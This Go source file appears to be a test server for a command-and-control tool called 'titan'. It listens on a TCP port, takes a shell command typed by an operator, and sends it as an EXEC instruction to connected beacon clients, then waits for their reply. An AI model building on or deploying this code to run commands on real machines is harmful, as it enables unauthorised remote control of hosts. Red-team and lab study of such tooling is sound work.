package main

import (
	"fmt"
	"log"
	"net"
	"strings"

	"github.com/BradHacker/titan/models"
)

const (
	listenHost = "localhost"
	listenPort = "1337"
)

func main() {
	listener, err := CreateTCPListener(listenHost, listenPort)
	if err != nil {
		log.Fatal(fmt.Printf("Error listening on %s:%s", listenHost, listenPort))
	}

	defer CloseListener(listener)

	for {
		c, err := AcceptConnection(listener)
		if err != nil {
			fmt.Println("Error connecting: ", err.Error())
			return
		}
		fmt.Println("Client " + c.RemoteAddr().String() + " connected.")
		go handleConnection(c)
	}
}

func handleConnection(conn net.Conn) {
	defer CloseConnection(conn)

	testInstruction := generateTestInstruction()
	err := SendInstruction(testInstruction, conn)
	if err != nil {
		fmt.Printf("Something went wrong while sending instruction: %v\n", err)
		return
	}

	err = WaitForBeaconReturn(conn)
	if err != nil {
		log.Fatal(fmt.Errorf("Error while waiting for Beacon response: %v", err))
	}
}

func generateTestInstruction() (instruction models.Instruction) {
	var testAction models.Action

	testAction.ActionType = "EXEC"
	input := ""
	fmt.Println("Enter command to run:")
	fmt.Scanln(&input)
	parts := strings.Split(input, " ")
	fmt.Println(parts)
	testAction.Cmd = parts[0]
	testAction.Args = parts[1:]

	instruction.Action = testAction
	return
}